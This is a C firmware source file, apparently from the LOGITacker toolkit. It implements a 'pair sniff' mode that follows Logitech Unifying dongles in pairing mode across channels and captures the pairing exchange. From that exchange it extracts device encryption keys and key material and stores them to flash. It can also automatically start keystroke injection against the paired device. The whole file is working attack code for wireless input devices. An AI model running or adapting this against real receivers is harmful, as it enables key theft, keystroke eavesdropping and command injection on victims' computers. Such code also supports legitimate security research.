#include "helper.h"
#include "logitacker_unifying.h"
#include "app_timer.h"
#include "logitacker_processor_pair_sniff.h"
#include "logitacker.h"
#include "logitacker_devices.h"

#define NRF_LOG_MODULE_NAME LOGITACKER_PROCESSOR_PAIR_SNIFF
#include "nrf_log.h"
#include "logitacker_options.h"
#include "logitacker_pairing_parser.h"
#include "logitacker_flash.h"
#include "logitacker_bsp.h"

NRF_LOG_MODULE_REGISTER();


typedef struct {
    app_timer_id_t timer_next_action;
    nrf_esb_payload_t tmp_rx_payload;
    nrf_esb_payload_t tmp_tx_payload;

    bool data_rx;
    uint32_t sniff_ticks;
    uint32_t sniff_ticks_long;

    logitacker_pairing_info_t device_pairing_info;

    bool dongle_in_range; //inidicates if a dongle in pairing mode is in range
} logitacker_processor_pair_sniff_ctx_t;

static logitacker_processor_t m_processor = {0};
static logitacker_processor_pair_sniff_ctx_t m_static_pair_sniff_ctx; //we reuse the same context, alternatively an malloc'ed ctx would allow separate instances
static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};


void processor_pair_sniff_init_func(logitacker_processor_t *p_processor);
void processor_pair_sniff_init_func_(logitacker_processor_pair_sniff_ctx_t *self);

void processor_pair_sniff_deinit_func(logitacker_processor_t *p_processor);
void processor_pair_sniff_deinit_func_(logitacker_processor_pair_sniff_ctx_t *self);

void processor_pair_sniff_esb_handler_func(logitacker_processor_t *p_processor, nrf_esb_evt_t *p_esb_evt);
void processor_pair_sniff_esb_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, nrf_esb_evt_t *p_esb_event);

void processor_pair_sniff_timer_handler_func(logitacker_processor_t *p_processor, void *p_timer_ctx);
void processor_pair_sniff_timer_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, void *p_timer_ctx);

void processor_pair_sniff_radio_handler_func(logitacker_processor_t *p_processor, radio_evt_t const *p_event);
void processor_pair_sniff_radio_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, radio_evt_t const *p_event);

void processor_pair_sniff_bsp_handler_func(logitacker_processor_t *p_processor, bsp_event_t event);
void processor_pair_sniff_bsp_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, bsp_event_t event);


void processor_pair_sniff_init_func(logitacker_processor_t *p_processor) {
    processor_pair_sniff_init_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx);
}

void processor_pair_sniff_deinit_func(logitacker_processor_t *p_processor){
    processor_pair_sniff_deinit_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx);
}

void processor_pair_sniff_esb_handler_func(logitacker_processor_t *p_processor, nrf_esb_evt_t *p_esb_evt){
    processor_pair_sniff_esb_handler_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx, p_esb_evt);
}

void processor_pair_sniff_timer_handler_func(logitacker_processor_t *p_processor, void *p_timer_ctx) {
    processor_pair_sniff_timer_handler_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx, p_timer_ctx);
}

void processor_pair_sniff_radio_handler_func(logitacker_processor_t *p_processor, radio_evt_t const *p_event) {
    processor_pair_sniff_radio_handler_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx, p_event);
}

void processor_pair_sniff_bsp_handler_func(logitacker_processor_t *p_processor, bsp_event_t event) {
    processor_pair_sniff_bsp_handler_func_((logitacker_processor_pair_sniff_ctx_t *) p_processor->p_ctx, event);
}

// restarts timer with:
// a) m_pair_sniff_ticks_long if data has been RXed since last call
// b) m_pair_sniff_ticks if no data has been RXed since last call
void pair_sniff_reset_timer(logitacker_processor_pair_sniff_ctx_t *self) {
    app_timer_stop(self->timer_next_action);
    if (self->data_rx) {
        app_timer_start(self->timer_next_action, self->sniff_ticks_long, NULL);
        self->data_rx = false;
    } else {
        app_timer_start(self->timer_next_action, self->sniff_ticks, NULL);
    }
}


void pair_sniff_assign_addr_to_pipe1(logitacker_processor_pair_sniff_ctx_t *self, uint8_t const *const rf_address) {
    uint8_t base[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base, &prefix, rf_address, 5);

    //stop time to prevent rewriting payloads
    app_timer_stop(self->timer_next_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_set_base_address_1(base);
    nrf_esb_update_prefix(1, prefix);
    nrf_esb_enable_pipes(0x03);
    nrf_esb_start_rx();
    app_timer_start(self->timer_next_action, self->sniff_ticks_long, NULL); // restart timer
}

void pair_sniff_disable_pipe1(logitacker_processor_pair_sniff_ctx_t *self) {
    //stop time to prevent rewriting payloads
    app_timer_stop(self->timer_next_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_enable_pipes(0x01);
    app_timer_start(self->timer_next_action, self->sniff_ticks, NULL); // restart timer
}

void pair_sniff_on_success(logitacker_processor_pair_sniff_ctx_t *self) {
    bsp_board_leds_off();
    bsp_board_led_on(LED_G);

    switch (g_logitacker_global_config.pair_sniff_on_success) {
        case OPTION_PAIR_SNIFF_ON_SUCCESS_CONTINUE:
            NRF_LOG_INFO("Continue to sniff pairing");
            return;
        case OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY:
            NRF_LOG_INFO("Sniffed full pairing, changing back to discover mode");
            app_timer_stop(self->timer_next_action);
            logitacker_enter_mode_discovery();
            break;
        case OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION:
            app_timer_stop(self->timer_next_action);
            helper_addr_to_hex_str(addr_str_buff, 5, self->device_pairing_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with active enumeration for %s", nrf_log_push(addr_str_buff));
            logitacker_enter_mode_active_enum(self->device_pairing_info.device_rf_address);
            break;
        case OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION:
            app_timer_stop(self->timer_next_action);
            helper_addr_to_hex_str(addr_str_buff, 5, self->device_pairing_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with passive enumeration for %s",
                         nrf_log_push(addr_str_buff));
            logitacker_enter_mode_passive_enum(self->device_pairing_info.device_rf_address);
            break;
        case OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_AUTO_INJECTION:
            {
                // try to fetch created device
                logitacker_devices_unifying_device_t * p_device;
                if (logitacker_devices_get_device(&p_device, self->device_pairing_info.device_rf_address) == NRF_SUCCESS) {
                    // if device found, start injection
                    app_timer_stop(self->timer_next_action);
                    if (p_device->executed_auto_inject_count < g_logitacker_global_config.max_auto_injects_per_device) {
                        p_device->executed_auto_inject_count++;
                        logitacker_enter_mode_injection(self->device_pairing_info.device_rf_address);
                        logitacker_injection_start_execution(true);
                    } else {
                        NRF_LOG_INFO("maximum number of autoinjects reached for this device, continue discovery mode")
                    }
                }
                // else continue "pair sniff"
            }
            break;
        default:
            break;
    }
}


void processor_pair_sniff_init_func_(logitacker_processor_pair_sniff_ctx_t *self) {
    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, UNIFYING_GLOBAL_PAIRING_ADDRESS);
    uint8_t base_addr[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base_addr, &prefix, UNIFYING_GLOBAL_PAIRING_ADDRESS, 5);

    NRF_LOG_INFO("Sniff pairing on address %s", addr_str_buff);


    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    nrf_esb_stop_rx(); //stop rx in case running



    bsp_board_leds_off(); //disable all LEDs

    uint32_t res = 0;
    res = nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_mode SNIFF: %d", res);
    res = nrf_esb_set_base_address_0(base_addr); // set base addr1
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);



    // add global pairing address to pipe 0
    res = nrf_esb_set_base_address_0(base_addr);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
    res = nrf_esb_update_prefix(0, prefix);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("update prefix 0: %d", res);

    nrf_esb_enable_pipes(0x01); //enable only pipe 0

    // prepare 1byte ping payload
    self->tmp_tx_payload.length = 1;
    self->tmp_tx_payload.data[0] = 0x00; // no valid unifying payload, but ack'ed on ESB radio layer
    self->tmp_tx_payload.pipe = 0; // pipe with global pairing address assigned
    self->tmp_tx_payload.noack = false; // we need an ack

    // setup radio as PTX
    nrf_esb_set_mode(NRF_ESB_MODE_PTX_STAY_RX);
    nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
    nrf_esb_set_all_channel_tx_failover_loop_count(4); //iterate over channels two times before failing


    self->data_rx = false;
    self->sniff_ticks = APP_TIMER_TICKS(3);
    self->sniff_ticks_long = APP_TIMER_TICKS(50);
    self->dongle_in_range=false;


    // use special channel lookup table for pairing mode
    nrf_esb_update_channel_frequency_table_unifying_pairing();

    // write payload (autostart TX is enabled for PTX mode)
    nrf_esb_write_payload(&self->tmp_tx_payload);
    app_timer_start(self->timer_next_action, self->sniff_ticks, NULL);

}

void processor_pair_sniff_deinit_func_(logitacker_processor_pair_sniff_ctx_t *self) {
    radio_disable_rx_timeout_event();
    radio_stop_channel_hopping();
    nrf_esb_stop_rx(); // there are chances that a TX running, as `NRF_ESB_MODE_PTX_STAY_RX`toggles between PTX/PRX

    nrf_esb_set_mode(NRF_ESB_MODE_PRX); //should disable and end up in idle state

    //restore channel table
    nrf_esb_update_channel_frequency_table_unifying();

    // disable all pipes
    nrf_esb_enable_pipes(0x00);

    bsp_board_leds_off();
}

void processor_pair_sniff_esb_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, nrf_esb_evt_t *p_esb_event) {
    uint32_t freq;
    nrf_esb_get_rf_frequency(&freq);

    switch (p_esb_event->evt_id) {
        // happens when PTX_stay_RX is in sub state PRX and receives data
        case NRF_ESB_EVENT_RX_RECEIVED:
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
            // we received data
            NRF_LOG_INFO("PAIR SNIFF data received on channel %d", freq);
            while (nrf_esb_read_rx_payload(&self->tmp_rx_payload) == NRF_SUCCESS) {
                self->data_rx = true;
                NRF_LOG_HEXDUMP_INFO(self->tmp_rx_payload.data, self->tmp_rx_payload.length);

                // check if pairing response phase 1, with new address
                if (self->tmp_rx_payload.length == 22 && self->tmp_rx_payload.data[1] == 0x1f && self->tmp_rx_payload.data[2] == 0x01) {

                    uint8_t new_address[LOGITACKER_DEVICE_ADDR_LEN] = { 0 };
                    memcpy(new_address, &self->tmp_rx_payload.data[3], LOGITACKER_DEVICE_ADDR_LEN);
                    pair_sniff_assign_addr_to_pipe1(self, new_address);

                    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, new_address);
                    NRF_LOG_INFO("PAIR SNIFF assigned %s as new sniffing address", addr_str_buff);

                    //enable red and green LED
                    bsp_board_leds_off();
                    bsp_board_led_on(LED_R);
                    bsp_board_led_on(LED_G);
                }

                // clear pairing info when new pairing request 1 is spotted
                if (self->tmp_rx_payload.length == 22 && self->tmp_rx_payload.data[1] == 0x5f && self->tmp_rx_payload.data[2] == 0x01) {
                    memset(&self->device_pairing_info, 0, sizeof(logitacker_pairing_info_t));
                }

                // parse pairing data
                if (logitacker_pairing_parser(&self->device_pairing_info, &self->tmp_rx_payload) == NRF_SUCCESS) {
                    // full pairing parsed (no frames missing)
                    pair_sniff_disable_pipe1(self);

                    //retrieve device or add new and update data
                    logitacker_devices_unifying_device_t * p_device = NULL;
                    //couldn't fetch device, try to create (gets existing one in case it is already defined)
                    logitacker_devices_create_device(&p_device, self->device_pairing_info.device_rf_address);
                    if (p_device == NULL) {
                        NRF_LOG_ERROR("failed adding device entry for pairing sniff result");
                    } else {
                        // copy pairing info to device data
                        logitacker_pairing_info_t pi = self->device_pairing_info;
                        memcpy(p_device->serial, pi.device_serial, 4);
                        memcpy(p_device->device_name, pi.device_name, pi.device_name_len);
                        memcpy(p_device->key, pi.device_key, 16);
                        memcpy(p_device->raw_key_data, pi.device_raw_key_material, 16);
                        memcpy(p_device->rf_address, pi.device_rf_address, 5);
                        memcpy(p_device->wpid, pi.device_wpid, 2);
                        p_device->caps = pi.device_caps;
                        p_device->report_types = pi.device_report_types;


                        if (p_device->p_dongle == NULL) {
                            NRF_LOG_ERROR("device doesn't point to dongle");
                        } else {
                            logitacker_devices_unifying_dongle_t * p_dongle = p_device->p_dongle;
                            memcpy(p_dongle->wpid, pi.dongle_wpid, 2);

                            p_dongle->classification = DONGLE_CLASSIFICATION_IS_LOGITECH;
                            if (p_dongle->wpid[0] == 0x88 && p_dongle->wpid[1] == 0x02) p_dongle->is_nordic = true;
                            if (p_dongle->wpid[0] == 0x88 && p_dongle->wpid[1] == 0x08) p_dongle->is_texas_instruments = true;

                        }
                        p_device->key_known = pi.key_material_complete;

                        // if auto store is enabled, store to flash
                        if (g_logitacker_global_config.auto_store_sniffed_pairing_devices) {
                            //check if already stored
                            logitacker_devices_unifying_device_t dummy_device;
                            if (logitacker_flash_get_device(&dummy_device, p_device->rf_address) != NRF_SUCCESS) {
                                // not existing on flash create it
                                if (logitacker_devices_store_ram_device_to_flash(p_device->rf_address) == NRF_SUCCESS) {
                                    NRF_LOG_INFO("device automatically stored to flash");
                                } else {
                                    NRF_LOG_WARNING("failed to store device to flash");
                                }
                            } else {
                                NRF_LOG_INFO("device already exists on flash");
                            }
                        }

                    }

                    pair_sniff_on_success(self);
                }
            }
            pair_sniff_reset_timer(self);
            break;
        case NRF_ESB_EVENT_TX_SUCCESS:
        {
            // we hit the dongle, but no data was received on the channel so far, we start a timer for ping re-transmission
            if (!self->dongle_in_range) {
                NRF_LOG_INFO("Spotted dongle in pairing mode, follow while channel hopping");
                self->dongle_in_range = true;
            }
            NRF_LOG_INFO("dongle on channel %d ", freq);
            pair_sniff_reset_timer(self);

            bsp_board_led_off(LED_R);
            bsp_board_led_off(LED_G);
            bsp_board_led_invert(LED_B);
            break;
        }
        case NRF_ESB_EVENT_TX_FAILED:
        {
            bsp_board_led_off(LED_B);
            bsp_board_led_off(LED_G);
            bsp_board_led_invert(LED_R);
            // missed dongle, re-transmit ping payload

            if (self->dongle_in_range) {
                // if dongle was in range before, notify tha we lost track
                NRF_LOG_INFO("Lost dongle in pairing mode, restart channel hopping");
                self->dongle_in_range = false;
            }

            NRF_LOG_DEBUG("TX_FAILED on all channels, retry %d ...", freq);
            // write payload again and start rx
            nrf_esb_start_tx();
        }
        default:
            break;
    }

}

void processor_pair_sniff_timer_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, void *p_timer_ctx) {
    nrf_esb_flush_tx(); //remove pending TX frames
    nrf_esb_write_payload(&self->tmp_tx_payload); //write and auto transmit current TX payload
}

void processor_pair_sniff_radio_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, radio_evt_t const *p_event) {

}

void processor_pair_sniff_bsp_handler_func_(logitacker_processor_pair_sniff_ctx_t *self, bsp_event_t event) {
    NRF_LOG_INFO("BSP event while sniffing pairing 0x%08x", event);
}


logitacker_processor_t * contruct_processor_pair_sniff_instance(logitacker_processor_pair_sniff_ctx_t *const pair_sniff_ctx) {
    m_processor.p_ctx = pair_sniff_ctx;

    m_processor.p_init_func = processor_pair_sniff_init_func;
    m_processor.p_deinit_func = processor_pair_sniff_deinit_func;
    m_processor.p_esb_handler = processor_pair_sniff_esb_handler_func;
    m_processor.p_timer_handler = processor_pair_sniff_timer_handler_func;
    m_processor.p_bsp_handler = processor_pair_sniff_bsp_handler_func;
    m_processor.p_radio_handler = processor_pair_sniff_radio_handler_func;

    return &m_processor;
}


logitacker_processor_t * new_processor_pair_sniff(app_timer_id_t timer_next_action) {
    // initialize context (static in this case, has to use malloc for new instances)
    logitacker_processor_pair_sniff_ctx_t *const p_ctx = &m_static_pair_sniff_ctx;
    memset(p_ctx, 0, sizeof(*p_ctx)); //replace with malloc for dedicated instance
    p_ctx->timer_next_action = timer_next_action;


    return contruct_processor_pair_sniff_instance(&m_static_pair_sniff_ctx);
}

